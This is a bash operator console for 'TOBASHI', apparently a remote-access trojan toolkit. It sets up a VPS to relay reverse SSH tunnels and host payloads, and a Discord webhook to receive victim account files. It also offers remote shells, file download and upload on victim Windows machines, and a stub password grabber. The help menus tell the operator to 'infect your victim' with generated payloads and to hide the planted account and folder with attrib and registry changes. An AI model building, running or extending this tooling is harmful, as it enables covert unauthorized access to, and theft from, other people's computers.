#!/bin/bash

#Couleurs : 

cyan="\e[36m"
gras="\e[1m"
red="\e[31m"
green="\e[32m"
reset="\e[0m"


main_menu(){

    clear

echo "
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
 ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ 
     ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌     ▐░▌     
     ▐░▌     ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     
     ▐░▌     ▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
     ▐░▌     ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌     ▐░▌     
     ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌▐░▌       ▐░▌     ▐░▌     
     ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌ ▄▄▄▄█░█▄▄▄▄ 
     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
      ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                                                           
    "

    echo -e "${red}"
    echo "______________________________________________________By flamendO_______________________V.1"
    echo -e "${reset}"


    echo -e "${gras}"

    vps_state=$(sed -n '2p' "./bin/state_machine.txt" | tr -d '\r')
    discord_state=$(sed -n '1p' "./bin/state_machine.txt" | tr -d '\r')

    color_state_vps="${red}"
    alarm_state_vps="No"
    color_state_discord="${red}"
    alarm_state_discord="No"

    if [ "$vps_state" = 1 ]; then
        color_state_vps="${green}"
        alarm_state_vps="Yes"
    fi

    if [ "$discord_state" = 1 ]; then
        color_state_discord="${green}"
        alarm_state_discord="Yes"
    fi




    echo "                                         Welcome ! Please choose an option : "
    echo -e "                                          ---------------***---------------                   ${cyan}      [+] State : ${reset} ${gras}"
    echo -e "                                                                                    [*] Discord Configuration : ${color_state_discord} ${alarm_state_discord} ${reset} ${gras}"
    echo -e "[+] Commands :                                                                      [*] VPS Configuration     : ${color_state_vps} ${alarm_state_vps} ${reset} ${gras}"
    echo "               "
    echo "      [user]...............Choose a user"
    echo "      [console]........Start the console"
    echo "      [discord].....Setting your discord"
    echo "      [vps]...............Setting-up VPS"
    echo "      [download]....Download from target"
    echo "      [upload]..........Upload to target"
    echo "      [grabber].........Password grabber"
    echo "      [killsession]..Kill target session"
    echo "      [reset]...........Restore settings"
    echo "      [quit]...........Leave the program"
    echo "      [help]........................Help"
    echo "      [uninstall]......Uninstall TOBASHI" # at the end mdr
    echo -e "${reset}"



}

#### choose_user --------------------------------------------------

choose_user(){
    clear
    echo -e "${gras}"

    echo "Welcome to your users repository, please choose a user version:"
    echo ""
    echo -e "${red}"
    echo "[local].........List of your local users"
    echo "[vps].............List of your VPS users"
    echo ""
    read -p "[+] Your user type ~: " user_type
    echo "$user_type"
    echo -e "${reset}"

    if [ "$user_type" = "local" ]; then
        echo "-----------------~~~-----------------"
        echo -e "${cyan}${gras}"
        files=(users/local/*)
        for i in "${!files[@]}"; do
            username=$(basename "${files[i]}" | cut -d'_' -f1)
            echo "[$((i+1))] $username"
        done
        echo -e "${reset}"

        read -p "[+] User~:$ " user
        user_file="$user.txt"

        # Vérifiez si le fichier existe avant de le lire
        if [ -e "./users/local/$user_file" ]; then
            # Récupération des données à partir du fichier
            username=$(head -n 1 "./users/local/$user_file" | tr -d '\r')
            ip=$(sed -n '2p' "./users/local/$user_file" | tr -d '\r')
            password=$(sed -n '3p' "./users/local/$user_file" | tr -d '\r')
            connection_type=$(tail -n 1 "./users/local/$user_file" | tr -d '\r')

            echo "The connection is $connection_type . "

        
        else
            echo "The file $user_file does not exist."
        fi
    
    elif [ "$user_type" = "vps" ]; then

        echo "-----------------~~~-----------------"
        echo -e "${cyan}${gras}"
        files=(users/vps/*)
        for i in "${!files[@]}"; do
            username=$(basename "${files[i]}" | cut -d'_' -f1)
            echo "[$((i+1))] $username"
        done
        echo -e "${reset}"

        read -p "[+] User~:$ " user
        user_file="$user.txt"

        # Vérifiez si le fichier existe avant de le lire
        if [ -e "./users/vps/$user_file" ]; then
            # Récupération des données à partir du fichier
            username=$(head -n 1 "./users/vps/$user_file" | tr -d '\r')
            ip=$(sed -n '2p' "./users/vps/$user_file" | tr -d '\r')
            password=$(sed -n '3p' "./users/vps/$user_file" | tr -d '\r')
            connection_type=$(tail -n 1 "./users/vps/$user_file" | tr -d '\r')
            remote_port=$(tail -n 2 "./users/vps/$user_file" | head -n 1 | tr -d '\r')
            ip_remote_vps=$(tail -n 3 "./users/vps/$user_file" | head -n 1 | tr -d '\r')
            startup_file=$(tail -n 4 "./users/vps/$user_file" | head -n 1 | tr -d '\r')
            temp_file=$(tail -n 5 "./users/vps/$user_file" | head -n 1 | tr -d '\r')


        
        else
            echo "The file $user_file does not exist."
        fi
    else
        echo "The folder does not exist ..."
    fi

    echo ""
    echo ""
    echo "USER SELECTED :"
    echo ""
    echo ""

    echo "-------------------------------"
    echo "|                             |"
    echo "          $user_file           "
    echo "|                             |"
    echo "-------------------------------"

    echo ""
    echo ""
    
    echo "Back to menu..."
    read -p "Appuyer pour continuer..." dummy
}


#### choose_user --------------------------------------------------


#### console_menu --------------------------------------------------

console_menu(){

    clear
    echo -e "${gras}"
    echo "IMPORTANT : in order to be invisible, you have to hide your new user folder:"
    echo ""
    echo "1. Go to the Powershell with [powershell]"
    echo "2. Tape : attrib +h +s +r C:\Users\[name_of_user]"
    echo ""
    echo -e "${reset}"
    echo "$connection_type"

    if [ "$connection_type" = "local" ]; then

    

        read -p "Tape Enter to go to the LOCAL console..." enter

        ssh -t "$username@$ip" # le -t permet d'initier la connexion et de sortir que si on met exit
        read -p "Tape Enter to exit the console..." dummy

    elif [ "$connection_type" = "remote" ]; then

        read -p "Tape Enter to go to the REMOTE console..." enter

        sshpass -p "$password" ssh -tt "$username@$ip_remote_vps" -p "$remote_port"

        read -p "Tape Enter to exit the console..." dummy
    else
        echo "No user choosed... Go to your user library !"
        read -p "Tape Enter to exit the console..." dummy

    fi

}


#### console_menu --------------------------------------------------



#### kill_menu-----------------------------------------------

kill_menu(){ #TODO : delete the Guest registery key
    clear

    echo -e "${gras}"
    echo "[*] WARNING : DO YOU REALLY WANT TO KILL THE $user 's SESSION ? .....[y/n]"

    read -p "Choice :~ " choice_kill

    if [ "$choice_kill" = "y" ]; then

        if [ "$connection_type" = "local" ]; then

            registryPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
            valueName="$username"

            sshpass -p "$password" ssh "$username@$ip" 'powershell -Command "Set-Service -Name sshd -StartupType 'Manual' " '
            sshpass -p "$password" ssh "$username@$ip" "powershell -Command \"Remove-ItemProperty -Path '$registryPath' -Name '$valueName'\""
            sshpass -p "$password" ssh "$username@$ip" "powershell -Command \"Remove-LocalUser -name '$valueName'\""
            rm ./users/local/$user_file

        elif [ "$connection_type" = "remote" ]; then

            registryPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
            valueName="$username"
            
            sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" 'powershell -Command "Set-Service -Name sshd -StartupType 'Manual' " '
            sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" "powershell -Command \"Remove-ItemProperty -Path '$registryPath' -Name '$valueName'\""
            sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" "powershell -Command \"Remove-Item -path '$temp_file\key'\""
            sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" "powershell -Command \"Remove-Item -path '$startup_file'\""
            sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" "powershell -Command \"Remove-LocalUser -name '$valueName'\"" 
            rm ./users/vps/$user_file

        else
            echo "No user choosed... Go to your user library !"

        fi

    elif [ "$choice_kill" = "n" ]; then
        echo "[+] The session of $user is still active ! ..."
        echo ""

    else

        echo "[+] Invalid option !....."
        echo ""
    fi

    read -p "Press Enter to continue..." kill_1
}


#### kill_menu-----------------------------------------------


#### download_menu-------------------------------------------

download_menu(){
    clear
    echo -e "${gras}"
    echo "Download Menu"
    echo "---------------------"
    echo -e "${cyan}${gras}"
    echo ""
    echo "---------------------"
    echo "ATTENTION : On Windows, don't use \\ but / instead, for example : C:/Users/..."
    echo ""
    echo "---------------------"

    # Utiliser la fonction read -r pour éviter l'interprétation des caractères d'échappement
    read -r -p "Enter the remote file path: " remote_file_path
    #read -p "Enter the local destination path: " local_destination_path
    echo -e "${reset}"

    if [ "$connection_type" = "local" ]; then

    python src/download_file.py $remote_file_path $username $password $ip $user

    elif [ "$connection_type" = "remote" ]; then

    python src/download_file_vps.py $remote_file_path $username $password $ip_remote_vps $remote_port $user

    else

    echo "No user choosed... Go to your user library !"

    fi

    echo ""


    read -p "Press Enter to continue..." dummy
}


#### download_menu-------------------------------------------


#### upload_menu-------------------------------------------

upload_menu(){
    clear
    echo -e "${gras}"
    echo "Upload Menu"
    echo "---------------------"
    echo -e "${cyan}${gras}"
    echo ""
    echo "---------------------"
    echo "ATTENTION : On Windows, don't use \\ but / instead, for example : C:/Users/..."
    echo ""
    echo "---------------------"

    
    read -r -p "Enter the local file path: " local_file_path
    read -r -p "Enter the remote file path: " remote_file_path
    
    echo -e "${reset}"

    if [ "$connection_type" = "local" ]; then

    python src/upload_file.py $local_file_path $remote_file_path $username $password $ip

    elif [ "$connection_type" = "remote" ]; then

    python src/upload_file_vps.py $local_file_path $remote_file_path $username $password $ip_remote_vps $remote_port

    else

        echo "No user choosed... Go to your user library !"

    fi

    echo ""


    read -p "Press Enter to continue..." dummy
}


#### upload_menu-------------------------------------------





### vps_menu--------------------------------------------


vps_menu(){
    clear
    echo "Welcome to VPS menu ! Please follow instructions : "
    echo "---------------***---------------"
    echo ""
    read -p "[+] Please write your VPS IP adress : " ip_vps
    read -p "[+] Please write your VPS username :" username_vps
    read -p "[+] Please write your VPS password :" password_vps

    sed -i "s/set \"kdujhfguyU=X.X.X.X\"/set \"kdujhfguyU=$ip_vps\"/" ./src/initial_vps.cmd

    sed -i "s/set \"EcSjRhAguo=X.X.X.X\"/set \"EcSjRhAguo=$ip_vps\"/" "./files/stage1_v.cmd"

    sed -i "s/\$nkowFESgaO = \"username\"/\$nkowFESgaO = \"$username_vps\"/" "./files/stage2_v.ps1"
    sed -i "s/\$ecPlmJVLRo = \"X.X.X.X\"/\$ecPlmJVLRo = \"$ip_vps\"/" "./files/stage2_v.ps1"



    echo "" >> ./src/initial_vps.cmd
    echo "" >> ./files/stage1_v.cmd
    echo "" >> ./files/stage2_v.ps1


    # INSTALLATION SUR LE VPS DES BONS FICHIERS

    # Commande pour cloner le référentiel git dans /var/www/html/TOBASHI- si le dossier n'existe pas
    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" '[ -d /var/www/html/TOBASHI- ] || sudo git clone https://github.com/flamendO/TOBASHI-.git /var/www/html/TOBASHI-'

    # Commande pour remplacer le fichier initial_vps.cmd dans TOBASHI-
    sshpass -p "$password_vps" scp ./src/initial_vps.cmd "$username_vps@$ip_vps":/var/www/html/TOBASHI-/src/initial_vps.cmd

    # Commande pour remplacer le fichier stage1_v.cmd dans TOBASHI-/files/
    sshpass -p "$password_vps" scp ./files/stage1_v.cmd "$username_vps@$ip_vps":/var/www/html/TOBASHI-/files/stage1_v.cmd

    # Commande pour remplacer le fichier stage2_v.ps1 dans TOBASHI-/files/
    sshpass -p "$password_vps" scp ./files/stage2_v.ps1 "$username_vps@$ip_vps":/var/www/html/TOBASHI-/files/stage2_v.ps1
    
    
    

    clear
    echo -e "${gras} ${red}"
    echo "[+] Modification of setting inside vps..."
    # Commande pour modifier le fichier sshd_config
    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i '/#AllowTcpForwarding/s/#//; /AllowTcpForwarding/s/no/yes/' /etc/ssh/sshd_config"

    # Commande pour ajouter à la fin du fichier sshd_config si la ligne n'existe pas
    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'sudo grep -qxF "GatewayPorts yes" /etc/ssh/sshd_config || echo "GatewayPorts yes" | sudo tee -a /etc/ssh/sshd_config'

    # Commande pour remplacer 'GatewayPorts no' par 'GatewayPorts yes' si nécessaire
    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'sudo sed -i "s/GatewayPorts no/GatewayPorts yes/" /etc/ssh/sshd_config'


    echo "[+] sshd_config updated..."
    echo -e "${reset}"

    read -p "[+] Click Enter to continue............."


    clear

    echo "[+] Checking if SSH key exists..."

    if [ ! -f ./key ]; then
        echo "[+] SSH key does not exist, generating..."
        sleep 2
        ssh-keygen -f ./key -N ""
        echo "[+] Key generated!"
    else
        echo "[+] SSH key already exists, skipping generation."
    fi

    echo ""
    read -p "[+] Click Enter to continue............."

    chmod 600 key
    sshpass -p "$password_vps" ssh-copy-id -i key $username_vps@$ip_vps


    clear
    echo ""
    echo "[+] Copying the key......"
    sleep 2

    sshpass -p "$password_vps" scp -r key $username_vps@$ip_vps:/var/www/html/TOBASHI-/
    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'chmod +r /var/www/html/TOBASHI-/key'
    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sed -i 's|DocumentRoot /var/www/html/|DocumentRoot /var/www/html/TOBASHI-/|' /etc/apache2/sites-available/000-default.conf"
    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sed -i 's|Directory /var/www/html/|Directory /var/www/html/TOBASHI-/|' /etc/apache2/sites-available/000-default.conf"
    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'systemctl restart apache2'

    # create config vps file

    echo "$ip_vps" > ./vps_settings/vps_conf.txt
    echo "$username_vps" >> ./vps_settings/vps_conf.txt
    echo "$password_vps" >> ./vps_settings/vps_conf.txt

    # copy the payload 
    cp ./src/initial_vps.cmd ./payloads_generated/initial_vps.cmd

    # Commande pour remplacer le fichier initial_vps et initial_local.cmd dans TOBASHI-/payload_generated/
    
    sshpass -p "$password_vps" scp ./payloads_generated/initial_vps.cmd "$username_vps@$ip_vps":/var/www/html/TOBASHI-/payloads_generated/initial_vps.cmd
    sshpass -p "$password_vps" scp ./payloads_generated/initial_local.cmd "$username_vps@$ip_vps":/var/www/html/TOBASHI-/payloads_generated/initial_local.cmd
    
    echo "[+] Copying payloads to VPS..."
    sleep 2

    echo "[+] Restarting VPS...."

    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'reboot'

    sed -i '2s/.*/1/' ./bin/state_machine.txt


    echo "[+] Key set ! Please infect your target with payloads_generated/initial_vps.cmd "
    read -p "[+] Click Enter to go back to the menu !............."

}
### vps_menu--------------------------------------------

### discord menu--------------------------------------------

discord_menu(){

    clear
    echo -e "${gras} ${cyan}"
    echo "Welcome to the Discord Webhook menu ! "
    echo ""
    echo -e "${reset}"
    echo -e "${gras}"
    echo "-----------------~~~-----------------"
    echo ""
    echo "The purpose of this menu is to set your discord webhook in order"
    echo "to receive remote informations on every users. To do so, just"
    echo "enter the link of your discord Webhook in the file discord_config/discord.txt then:"
    echo ""
    echo -e "${cyan}"
    read -p "Click Enter when it's done......" dummy
    echo -e "${reset}"
    echo -e "${gras}"
    echo "Setting payloads...."
    sleep 1
    python ./src/discord.py 

    clear
    echo "Discord server has been added..."
    cp ./src/initial_local.cmd ./payloads_generated/initial_local.cmd
    sed -i '1s/.*/1/' ./bin/state_machine.txt
    echo ""
    read -p "Click Enter to go back to the menu...." dummy

}


### discord menu--------------------------------------------




### reset menu--------------------------------------------

reset_menu(){

    clear
    echo -e "${gras}"
    echo "[+] Welcome to the reset menu, Please choose what you want to reset :"
    echo ""
    echo "-------------------------------~*~-------------------------------"
    echo ""
    echo -e "${red}"
    echo "      [discord]...........Reset discord settings"
    echo "      [vps]...................Reset VPS settings"
    echo "      [all]..........Reset everything by default"
    echo ""
    echo -e "${reset}"
    echo -e "${gras} ${cyan}"
    read -p "Reset Option :~ " reset_option
    echo -e "${reset}"

    if [ "$reset_option" = "discord" ]; then
        cp ./bin/discord_save.txt ./discord_config/discord.txt
        cp ./bin/initial_local_save.cmd ./src/initial_local.cmd
        cp ./bin/initial_vps_save.cmd ./src/initial_vps.cmd

        cp ./bin/initial_local_save.cmd ./payloads_generated/initial_local.cmd
        cp ./bin/initial_vps_save.cmd ./payloads_generated/initial_vps.cmd
        
        clear
        echo -e "${gras} ${red}"
        sed -i '1s/.*/0/' ./bin/state_machine.txt
        echo "[+] Options are reset !"
        echo -e "${reset}"
        sleep 2

    elif [ "$reset_option" = "vps" ]; then
        first_line=$(head -n 1 ./files/stage2_v.ps1)
        if [[ $first_line != *"username"* ]]; then

            ip_vps=$(head -n 1 "./vps_settings/vps_conf.txt" | tr -d '\r')
            username_vps=$(sed -n '2p' "./vps_settings/vps_conf.txt" | tr -d '\r')
            password_vps=$(sed -n '3p' "./vps_settings/vps_conf.txt" | tr -d '\r')

            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'rm -R /var/www/html/TOBASHI-'
            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's/AllowTcpForwarding yes/#AllowTcpForwarding no/' /etc/ssh/sshd_config"
            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'sudo sed -i "/GatewayPorts yes/d" /etc/ssh/sshd_config'
            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'service apache2 stop'
            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's|<Directory /var/www/html/TOBASHI-/>|<Directory /var/www/html/>|' /etc/apache2/sites-available/000-default.conf"
            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's|DocumentRoot /var/www/html/TOBASHI-/|DocumentRoot /var/www/html/|' /etc/apache2/sites-available/000-default.conf"

            cp ./bin/initial_vps_save.cmd ./src/initial_vps.cmd
            cp ./bin/stage1_v_save.cmd ./files/stage1_v.cmd
            cp ./bin/stage2_v_save.ps1 ./files/stage2_v.ps1
            rm ./key ./key.pub
            rm ./vps_settings/vps_conf.txt
            cp ./bin/initial_vps_save.cmd ./payloads_generated/initial_vps.cmd
            sed -i '2s/.*/0/' ./bin/state_machine.txt
            clear
            echo -e "${gras} ${red}"
            echo "[+] Options are reset !"
            echo -e "${reset}"
            sleep 2

        else
            echo -e "${gras} ${red}"
            echo "[*] There is no VPS configuration to reset !...."
            echo -e "${reset}"
            echo ""
            read -p "Click Enter to go back to the menu....." dummy

        fi
    
    elif [ "$reset_option" = "all" ]; then
        first_line=$(head -n 1 ./files/stage2_v.ps1)
        if [[ $first_line != *"username"* ]]; then

            ip_vps=$(head -n 1 "./vps_settings/vps_conf.txt" | tr -d '\r')
            username_vps=$(sed -n '2p' "./vps_settings/vps_conf.txt" | tr -d '\r')
            password_vps=$(sed -n '3p' "./vps_settings/vps_conf.txt" | tr -d '\r')

            cp ./bin/discord_save.txt ./discord_config/discord.txt
            cp ./bin/initial_local_save.cmd ./src/initial_local.cmd
            cp ./bin/initial_vps_save.cmd ./src/initial_vps.cmd

            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'rm -R /var/www/html/TOBASHI-'
            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's/AllowTcpForwarding yes/#AllowTcpForwarding no/' /etc/ssh/sshd_config"
            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'sudo sed -i "/GatewayPorts yes/d" /etc/ssh/sshd_config'
            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'service apache2 stop'
            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's|<Directory /var/www/html/TOBASHI-/>|<Directory /var/www/html/>|' /etc/apache2/sites-available/000-default.conf"
            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's|DocumentRoot /var/www/html/TOBASHI-/|DocumentRoot /var/www/html/|' /etc/apache2/sites-available/000-default.conf"

            cp ./bin/initial_vps_save.cmd ./src/initial_vps.cmd
            cp ./bin/stage1_v_save.cmd ./files/stage1_v.cmd
            cp ./bin/stage2_v_save.ps1 ./files/stage2_v.ps1
            rm ./key ./key.pub
            rm ./vps_settings/vps_conf.txt

            cp ./bin/initial_local_save.cmd ./payloads_generated/initial_local.cmd
            cp ./bin/initial_vps_save.cmd ./payloads_generated/initial_vps.cmd

            clear
            echo -e "${gras} ${red}"
            sed -i '1s/.*/0/' ./bin/state_machine.txt
            sed -i '2s/.*/0/' ./bin/state_machine.txt
            echo "[+] Options are reset !"
            echo -e "${reset}"
            sleep 2


        else
            echo -e "${gras} ${red}"
            echo "[*] There is no VPS configuration to reset !...."
            echo -e "${reset}"
            echo ""
            read -p "Click Enter to go back to the menu....." dummy

        fi


    else
        echo -e "${gras} ${red}"
        echo "[*] Option invalid !...."
        echo -e "${reset}"
        echo ""
        read -p "Click Enter to go back to the menu....." dummy

    fi
    
}

### reset menu--------------------------------------------


### Help Menu--------------------------------------------

help_menu(){

    clear
    echo -e "${gras}"
    echo "
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
 ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ 
     ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌     ▐░▌     
     ▐░▌     ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     
     ▐░▌     ▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
     ▐░▌     ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌     ▐░▌     
     ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌▐░▌       ▐░▌     ▐░▌     
     ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌ ▄▄▄▄█░█▄▄▄▄ 
     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
      ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                                                           
    "

    echo ""
    echo "_______________________*~HELP MENU~*_______________________"
    echo ""
    echo -e "${red}"
    echo "Please select a topic :"
    echo -e "${reset}"
    echo -e "${gras}"

    echo "          [local].........Step to a local attack"
    echo "          [external]..Step to an external attack"
    echo "          [discord]..Set up your discord webhook"
    
    echo -e "${cyan}"
    read -p "Option :~ " help_option
    echo -e "${reset}"

    if [ "$help_option" = "local" ]; then
        clear
        echo ""
        echo "Follow Steps to configure local payload : "
        echo ""
        echo "[1]. Take the link of your discord webhook, copy and paste into the file /discord_config/discord.txt at the line"
        echo "below \"DISCORD WEBHOOK\". Then go to the main menu and select the option \"discord\" and click \"Enter\" to finish"
        echo "the configuration."
        echo ""
        echo "[2]. You can take the payload in /payload_generated/initial_local.cmd and infect your victim with it."
        echo ""
        echo "[3]. A discord user configuration file will automatically be send to your discord server in the tobashi console,"
        echo "Copy this file and paste it in /users/local/."
        echo ""
        echo "[4]. Go to the main menu of tobashi, and select the option \"user\" to select the user that you want to remote."
        echo "Note that you can select here if you want to do a local or external (vps) attack."
        echo ""
        echo "[5]. Now you can remote the target machine by select the option \"console\" in the main menu of tobashi."
        echo ""
        echo "[6]. ADVICE : command : powershell to go on a remote powershell. You can also hide the user file in C:\\Users\\ by execute"
        echo "attrib +h +s +r C:\\Users\\[name_of_file_user]".
        echo ""
        echo "[7]. When you are finished, just enter this command : \"exit\" (two times if you are in the powershell of the target)."

        read -p "Click Enter to go back to the menu...." dummy

    elif [ "$help_option" = "external" ]; then
        clear
        echo ""
        echo "Follow Steps to configure external (vps) payload :"
        echo ""
        echo "[1]. Take the link of your discord webhook, copy and paste into the file /discord_config/discord.txt at the line"
        echo "below \"DISCORD WEBHOOK\". Then go to the main menu and select the option \"discord\" and click \"Enter\" to finish"
        echo "the configuration."
        echo ""
        echo "[2]. Configure your VPS by select the option \"vps\" in the main menu and add your username, vps ip adress, vps password"
        echo "This will set your VPS to create automatically a ssh tunnelling between victims and your machine. The VPS will automatically"
        echo "restart, in order to prevent from classic errors."
        echo ""
        echo "[3]. You can take the payload in /payload_generated/initial_vps.cmd and infect your victim with it."
        echo ""
        echo "[4]. A discord user configuration file will automatically be send to your discord server in the tobashi console,"
        echo "Copy this file and paste it in /users/vps/."
        echo ""
        echo "[5]. Go to the main menu of tobashi, and select the option \"user\" to select the user that you want to remote."
        echo "Note that you can select here if you want to do a local or external (vps) attack."
        echo ""
        echo "[6]. Now you can remote the target machine by select the option \"console\" in the main menu of tobashi."
        echo ""
        echo "[7]. ADVICE : command : powershell to go on a remote powershell. You can also hide the user file in C:\\Users\\ by execute"
        echo "attrib +h +s +r C:\\Users\\[name_of_file_user]".
        echo ""
        echo "[8]. When you are finished, just enter this command : \"exit\" (two times if you are in the powershell of the target)."
        read -p "Click Enter to go back to the menu...." dummy

    elif [ "$help_option" = "discord" ]; then
        clear
        echo "Follow Steps to configure your discord webhook : "
        echo ""
        echo "[1]. Go to discord, in the bottom left side, you have a \"New\" button, click here and create"
        echo "your discord server. Create a new channel with the name that you want."
        echo ""
        echo "[2]. To set up a new discord webhook and linked to the channel, go to your server settings,"
        echo "click to \"Integration\" in the section called \"Application\". Then go to \"Webhook\", and "
        echo "create a new discord webhook."
        echo ""
        echo "[3]. ATTENTION : The name of the discord webhook MUST BE \"tobashiconsole\". Select the channel"
        echo "that you've create before." 
        echo ""
        echo "[4]. Your discord webhook is now set !"
        echo ""
        read -p "[+] Click Enter to back to the menu........." dummy
    else
        echo "[+] Invalid Option !...... "
        echo ""
        read -p "[+] Click Enter to back to the menu........." dummy

    fi
}

### Help Menu--------------------------------------------

### grabber Menu--------------------------------------------

grabber_menu(){

    clear
    echo "test"
    read -p "Enter...." dummy


}

### grabber Menu--------------------------------------------








while true
do
    main_menu

    echo -e "${cyan}${gras}"
    read -p "[+] Option~:$ " choix_main_menu
    echo -e "${reset}"

    case $choix_main_menu in 

    generate)

        generate_menu
        ;;

    user)

        choose_user
        ;;
    
    console)

        console_menu
        ;;

    discord)

        discord_menu
        ;;


    vps)

        vps_menu
        ;;

    download)

        download_menu
        ;;
    
    upload)

        upload_menu
        ;;

    grabber)

        grabber_menu
        ;;
    
    reset)

        reset_menu
        ;;

    killsession)

        kill_menu
        ;;

    quit)

        clear
        echo -e "${gras}"
        echo "GoodBye !"
        echo -e "${reset}"
        exit 0
        ;;

    help)

        help_menu
        ;;
    
    uninstall)

        uninstall_menu
        ;;

        
    esac

done

